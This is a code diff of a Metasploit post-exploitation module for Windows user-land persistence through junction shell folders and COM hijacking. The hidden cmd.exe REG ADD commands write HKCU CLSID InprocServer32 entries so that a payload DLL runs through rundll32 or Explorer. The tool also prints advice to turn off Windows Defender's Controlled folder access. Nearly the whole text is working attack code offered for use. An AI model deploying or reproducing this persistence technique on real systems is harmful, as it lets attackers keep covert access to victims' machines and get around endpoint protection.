@@ -152,34 +152,58 @@ class MetasploitModule < Msf::Post
 
 def run
   session = client
+  #
+  # Variable declarations (msf API calls)
+  #
+  oscheck = client.fs.file.expand_path("%OS%")
+  sysnfo = session.sys.config.sysinfo
+  runtor = client.sys.config.getuid
+  runsession = client.session_host
+  directory = client.fs.dir.pwd
+  #
+  # MODULE BANNER
+  #
+  print_line("    +-----------------------------------------------+")
+  print_line("    | Juntion Shell Folders (User-Land Persistence) |")
+  print_line("    |           Author : r00t-3xp10it (SSA)         |")
+  print_line("    +-----------------------------------------------+")
+  print_line("")
+  print_line("    Running on session  : #{datastore['SESSION']}")
+  print_line("    Computer            : #{sysnfo['Computer']}")
+  print_line("    Operative System    : #{sysnfo['OS']}")
+  print_line("    Target IP addr      : #{runsession}")
+  print_line("    Payload directory   : #{directory}")
+  print_line("    Client UID          : #{runtor}")
+  print_line("")
+  print_line("")
+
 
     #
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operating system (windows-not-wine)
-    oscheck = client.fs.file.expand_path("%OS%")
+    # check for proper operative system (windows-not-wine)
     if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
       return nil
     end
     #
-    # check for proper operating system (not windows 10)
+    # check for proper operative system (not windows 10)
     #
     if sysinfo['OS'] =~ /Windows 10/
-      print_warning("windows 10 version its protected againts this exploit ...")
-      print_line("-------------------------------------------------------------")
-      print_line("    Disable 'access controled to folders' in windows defender")
-      print_line("    If you wish to teste this on windows 10 version distros.")
-      print_line("-------------------------------------------------------------")
-      Rex::sleep(2.5)
+      print_warning("windows 10 version its protected againts this exploit.")
+      print_line("-----------------------------------------------------------")
+      print_line("    Disable 'Controlled folder access' in Windows Defender")
+      print_line("    If you wish to teste this on windows 10 version distros")
+      print_line("-----------------------------------------------------------")
+      Rex::sleep(5.0)
     end
 
 
   # variable declarations ..
   app_path = datastore['APP_PATH']    # %windir%\\System32\\calc.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
-  hive_key = "HKCU\\Software\\Classes\\CLSID\\" # uac hive key (CLSID)
+  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -241,8 +265,10 @@ def run
       # create new GUID and store it in a variable
       print_status("Creating new GUID value ..")
       Rex::sleep(1.0)
-      new_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
-      print_good("New GUID: #{new_GUID}")
+      rep_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
+      print_good("New GUID  : #{rep_GUID}")
+      # add parentesis to GUID value
+      new_GUID = "{#{rep_GUID}}"
       Rex::sleep(1.0)
 
 
@@ -251,9 +277,6 @@ def run
      #
      if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
        dll_exe = "rundll32.exe #{app_path},main"
-       print_status("Persiste in Explorer selected ..")
-       print_warning("This option requires an payload.dll ..")
-       Rex::sleep(1.0)
        hacks = [
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f',
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
@@ -266,8 +289,6 @@ def run
        # This option [DEMO] can still be configurated to launch an payload.dll
        # for that we just need to input: set APPL_PATH rundll32 %tmp%\\payload.dll,main ;)
        #
-       print_status("Exploit Demo mode selected ..")
-       Rex::sleep(1.0)
        hacks = [
         '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f'
        ]
@@ -280,7 +301,7 @@ def run
           begin
             # execute cmd prompt in a hidden channelized windows
             r = session.sys.process.execute("cmd.exe /R REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
-            print_line("  Hijacking : #{cmd}")
+            print_line("    Hijacking : #{cmd}")
  
                # close client channel when done
                while(d = r.channel.read)
@@ -324,32 +345,32 @@ def run
        if datastore['PERSIST_EXPLORER'] == true
          folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
          print_good("Module execution finished ..")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{folder_poc}")
          print_line("")
          print_line("    To delete all changes made:")
          print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        elsif datastore['RENAME_PERSIST'] == true
          ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
          print_good("Module execution finished ..")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{ren_per}")
          print_line("")
          print_line("    To delete all changes made:")
          print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
          print_line("    cmd.exe /c rename \"#{ren_per}.{new_GUID} #{ren_per}\"")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        else
          print_good("Module execution finished ..")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          print_line("    Trigger exploit: #{fol_path}")
          print_line("")
          print_line("    To delete all changes made:")
          print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-         print_line("--------------------------------")
+         print_line("-----------------------------------------------------------")
          Rex::sleep(1.0)
        end
 
